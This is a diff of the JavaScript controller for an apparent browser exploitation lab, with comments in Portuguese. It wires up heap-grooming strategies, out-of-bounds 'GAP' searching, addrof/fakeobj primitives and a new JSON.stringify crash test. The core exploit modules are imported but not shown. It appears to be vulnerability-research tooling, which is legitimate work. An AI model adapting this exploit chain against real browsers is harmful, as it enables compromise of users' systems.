@@ -5,17 +5,19 @@ import * as Core from './core_exploit.mjs';
 import * as Groomer from './heap_groomer.mjs';
 import * as Corruptor from './victim_corruptor.mjs';
 import * as PostExploit from './post_exploit_conceptual.mjs';
+import * as JsonExploitTest from './json_exploit_test.mjs'; // <<< NOVO IMPORT
 import { updateOOBConfigFromUI as updateGlobalOOBConfig } from './config.mjs';
 
-let uiInitialized = false; // Flag para garantir que a UI é inicializada apenas uma vez
+let uiInitialized = false;
 
 const App = {
-    exploitSuccessfulThisSession: false, // Renomeado para clareza
+    exploitSuccessfulThisSession: false,
     isCurrentlyRunningStrategies: false,
 
+    // ... (runAllGroomingStrategies e updateCurrentTestGapFromScanUIAndTestSingle como antes) ...
     runAllGroomingStrategies: async () => {
         const FNAME_STRAT = "App.runAllGroomingStrategies";
-        const runId = Math.random().toString(16).slice(2,10); // ID único para esta execução
+        const runId = Math.random().toString(16).slice(2,10);
         appLog(`[${runId}] >>> Entrando em ${FNAME_STRAT}`, 'critical', FNAME_STRAT);
 
         if (App.isCurrentlyRunningStrategies) {
@@ -125,7 +127,7 @@ const App = {
             await PAUSE_LAB(2000);
             appLog(`[${runId}]    Depois de PAUSE_LAB(2000)`, "debug", FNAME_STRAT);
             appLog(`[${runId}] Loop Estratégia: ${strat.name} - Fim`, "info", FNAME_STRAT);
-        } // Fim do loop for (const strat of strategies)
+        }
 
         appLog(`[${runId}] --- ${FNAME_STRAT} Concluído (Após loop de estratégias) ---`, 'test', FNAME_STRAT);
         if (Corruptor.getLastSuccessfulGap() !== null) {
@@ -133,15 +135,14 @@ const App = {
             App.exploitSuccessfulThisSession = true;
             const addrofGapEl = document.getElementById('addrofGap');
             if (addrofGapEl) addrofGapEl.value = Corruptor.getLastSuccessfulGap();
-            if (btnRunStrategies) btnRunStrategies.textContent = "GAP Encontrado! Recarregue para tentar de novo."; // Mantém desabilitado
-            // Não reabilita o botão aqui se foi sucesso
+            if (btnRunStrategies) btnRunStrategies.textContent = "GAP Encontrado! Recarregue para tentar de novo.";
         } else {
             appLog(`[${runId}] Nenhuma estratégia resultou em GAP de sucesso nesta rodada.`, "error", FNAME_STRAT);
-            if (btnRunStrategies) btnRunStrategies.disabled = false; // Reabilita se não houve sucesso
+            if (btnRunStrategies) btnRunStrategies.disabled = false;
         }
         App.isCurrentlyRunningStrategies = false;
         appLog(`[${runId}] <<< Saindo de ${FNAME_STRAT}`, 'critical', FNAME_STRAT);
-    }, // Fim de runAllGroomingStrategies
+    },
 
     updateCurrentTestGapFromScanUIAndTestSingle: () => {
         const FNAME_SINGLE = "App.updateCurrentTestGapFromScanUIAndTestSingle";
@@ -163,10 +164,9 @@ const App = {
             Corruptor.try_corrupt_fields_for_gap(Corruptor.getCurrentTestGap());
         } else { appLog("Valor de GAP inválido.", "error", "App.Config"); }
         appLog(`<<< Saindo de ${FNAME_SINGLE}`, "info", FNAME_SINGLE);
-    }, // Fim de updateCurrentTestGapFromScanUIAndTestSingle
+    },
 
     setupUIEventListeners: () => {
-        // ... (sem alterações aqui, a passagem de appLog para Int64Lib.testModule já estava correta) ...
         const moduleTestButtonsContainer = document.getElementById('moduleTestButtons');
         if (moduleTestButtonsContainer) {
             moduleTestButtonsContainer.innerHTML = '';
@@ -199,11 +199,12 @@ const App = {
         document.getElementById('btnSetupAddrofConceptual')?.addEventListener('click', PostExploit.setup_addrof_fakeobj_pair_conceptual);
         document.getElementById('btnTestAddrofConceptual')?.addEventListener('click', PostExploit.test_addrof_conceptual);
         document.getElementById('btnTestFakeobjConceptual')?.addEventListener('click', PostExploit.test_fakeobj_conceptual);
+        document.getElementById('btnTestJsonStringify')?.addEventListener('click', JsonExploitTest.attemptJsonStringifyCrash); // <<< NOVO LISTENER
 
         document.getElementById('oobAllocSize')?.addEventListener('change', updateGlobalOOBConfig);
         document.getElementById('baseOffset')?.addEventListener('change', updateGlobalOOBConfig);
         document.getElementById('initialBufSize')?.addEventListener('change', updateGlobalOOBConfig);
-    }, // Fim de setupUIEventListeners
+    },
 
     initialize: () => {
         if (uiInitialized) {
@@ -219,12 +220,12 @@ const App = {
             btnRunStrategies.disabled = false;
             btnRunStrategies.textContent = "Executar Todas Estratégias de Grooming & Busca de GAP";
         }
-        appLog("Laboratório Modularizado (v2.8.5 - Debug Reinício) pronto.", "good", "App.Init");
+        appLog("Laboratório Modularizado (v2.8.6 - Teste JSON Integrado) pronto.", "good", "App.Init"); // Versão atualizada
         const addrofGapEl = document.getElementById('addrofGap');
         if (addrofGapEl) addrofGapEl.value = "";
         uiInitialized = true;
-    } // Fim de initialize
-}; // Fim do objeto App
+    }
+};
 
 if (document.readyState === 'loading') {
     document.addEventListener('DOMContentLoaded', App.initialize);
